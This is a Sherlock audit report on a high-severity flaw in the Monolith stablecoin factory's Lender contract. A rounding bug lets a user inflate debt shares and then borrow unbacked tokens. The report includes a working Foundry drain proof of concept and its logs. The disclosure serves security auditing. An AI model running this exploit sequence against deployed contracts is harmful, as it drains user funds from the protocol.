---
tags:
  - lang/solidity
  - sector/lending
  - sector/stable
  - platform/sherlock
  - has/github
  - has/poc
  - severity/high
  - impact/loss-of-funds/direct-drain
protocol: "[[Monolith]]"
auditors:
  - "[[0xc0ffEE]]"
  - "[[Audittens]]"
  - "[[SOPROBRO]]"
  - "[[Uddercover]]"
  - "[[Valves]]"
  - "[[bughuntoor]]"
  - "[[dandan]]"
  - "[[deadmanwalking]]"
  - "[[songyuqi]]"
  - "[[wickie]]"
report: "https://github.com/sherlock-audit/2025-12-monolith-stablecoin-factory-judging"
genome:
  - "[[precision-loss]]"
  - "[[direct-drain]]"
  - "[[integer-bounds]]"
---
# H-1: User can abuse rounding issue in order to borrow unbacked tokens

- id: 64955
- impact: HIGH
- protocol: [[Monolith]] Stablecoin Factory
- reporter: bughuntoor (Sherlock)
- source: N/A

## Summary


The bug report describes a vulnerability in a stablecoin factory contract that allows users to borrow unbacked tokens. This can be achieved by exploiting a rounding issue in the code, which allows users to inflate the ratio of free shares to free debt. By redeeming almost all of their debt, users can maintain a high ratio even after the debasement. This allows them to obtain a large amount of debt shares, which can then be used to borrow a significant amount of tokens. This effectively allows the user to create tokens out of thin air, draining the contract of all its funds.

The root cause of this issue is a rounding issue in the code, which causes the debt of each user to be rounded up. By exploiting this, users can redeem almost all of their debt and still maintain a high ratio, allowing them to borrow more tokens than they actually have debt for. This attack can be performed at any time, even if there are active users with free debt.

The code affected by this issue can be found at the specified link. The attack can be performed by following a specific sequence of steps, which is outlined in the report. The impact of this vulnerability is the draining of all funds from the contract.

A proof of concept (PoC) is provided in the report, which demonstrates how the attack can be carried out. The report also suggests that fixing this issue is not a trivial task.

In summary, this bug report highlights a vulnerability in a stablecoin factory contract that allows users to borrow unbacked tokens by exploiting a rounding issue in the code. The report provides details on the root cause, affected code, attack path, impact, and a PoC for this vulnerability. It also mentions that fixing this issue is not an easy task.

## Details


Source: https://github.com/sherlock-audit/2025-12-monolith-stablecoin-factory-judging/issues/734 

## Found by 
0xc0ffEE, Audittens, SOPROBRO, Uddercover, Valves, bughuntoor, dandan, deadmanwalking, songyuqi, wickie

### Summary

Using multiple steps, user can abuse a rounding issue to borrow unbacked tokens. First, using the `redeem` method, the user can inflate the `freeShares/ freeDebt` ratio. When it exceeds 1e9 it debases by 1e18. However, the user can simply do debts of higher than 1e18, and redeeming all but 1 wei, basically inflating the ratio even after the debasement.

```solidity
        if (totalFreeDebtShares / totalFreeDebt > 1e9) {
            epoch++;
            totalFreeDebtShares = totalFreeDebtShares.mulDivUp(1e18, 1e36);
            emit NewEpoch(epoch);
        }
```

Using this, the user can obtain a really large amount of debt shares (such as 1e32). 
Then, it is important to know that each user's debt is rounded up. So if we have two users and all but 1 wei is redeemed, both user's personal debts will be 1.

So if the user has large amount of debt shares on 1 wallet, and debt on another wallet, they can redeem all but 1 wei and both wallets will still have debt. Then, the user can repay the debt on the 2nd wallet, which would make the `totalFreeDebt == 0` while `totalFreeDebtShares == 1e32`. Then, they can go on a third wallet and make a new borrow. Since `totalFreeDebt` is 0, debt shares will be minted 1:1 

```solidity
    function increaseDebt(address account, uint256 amount) internal {
        if (isRedeemable[account]) {
            // Handle free debt
            uint256 shares = totalFreeDebt == 0 ? amount : amount.mulDivUp(totalFreeDebtShares, totalFreeDebt);
```

This means that a user can make a borrow for 1e27 ($1b) and they'll receive 1e27 shares. However, total shares are >1e32, so the newly minted debt shares will be worth only `1e27 * 1e27 / 1e32 = 1e22` debt, effectively allowing the user to mint $1b out of thin air.

Note that the attack can be performed at any time, as even if there are active free debt users, user can simply redeem them and perform the attack.

### Root Cause

Rounding issue.

### Affected Code
https://github.com/sherlock-audit/2025-12-monolith-stablecoin-factory/blob/main/Monolith/src/Lender.sol#L606

### Attack Path

Check PoC

### Impact

Draining of all funds

### PoC

```solidity
        function test_drain() public {
            address user = address(1);

            ERC20Mock collateral = ERC20Mock(address(lender.collateral()));
            ERC20Mock coin = ERC20Mock(address(lender.coin()));

            vm.startPrank(user);
            collateral.mint(user, 1e40);
            coin.mint(user, 1e40);
            collateral.approve(address(lender), type(uint256).max);
            coin.approve(address(lender), type(uint256).max);

            lender.setRedemptionStatus(user, true);

            for (uint256 i; i < 7; i++) {
                lender.adjust(user, 1e23, 1e22);
                uint256 totalFreeDebt = lender.totalFreeDebt();
                lender.redeem(totalFreeDebt - 1, 0);
            }

            lender.adjust(user, 1e23, 1e22);

            address user2 = address(2);
            collateral.mint(user2, 1e23);
            vm.startPrank(user2);
            collateral.approve(address(lender), type(uint256).max);
            lender.setRedemptionStatus(user2, true);
            lender.adjust(user2, 1e23, 1e22);

            vm.startPrank(user);

            uint256 totalFreeDebt = lender.totalFreeDebt();
            coin.mint(user, totalFreeDebt);

            lender.redeem(totalFreeDebt - 1, 0);

            console.log("%e", lender.totalFreeDebtShares());
            console.log(lender.totalFreeDebt());

            vm.startPrank(user2);
            coin.approve(address(lender), type(uint256).max);
            lender.adjust(user2, 0, -1);

            console.log("%e", lender.totalFreeDebtShares());
            console.log(lender.totalFreeDebt());
            
            vm.startPrank(user2);
            // user2 has ~1e22 collateral, but is able to borrow 1e27;
            lender.adjust(user2, 0, 1e27);
            uint256 debt = lender.getDebtOf(user2);
            console.log("debt %e", debt); // user borrowed 1e27, but has only 1e22 debt

        }
```
Logs:
```javascript
[PASS] test_drain() (gas: 1138922)
Logs:
  2.00000002000200020002050200020101e32
  1
  1.00000001000100010001030100010101e32
  0
  debt 9.999899900991990170185e21
```




### Mitigation

fix is non-trivial.
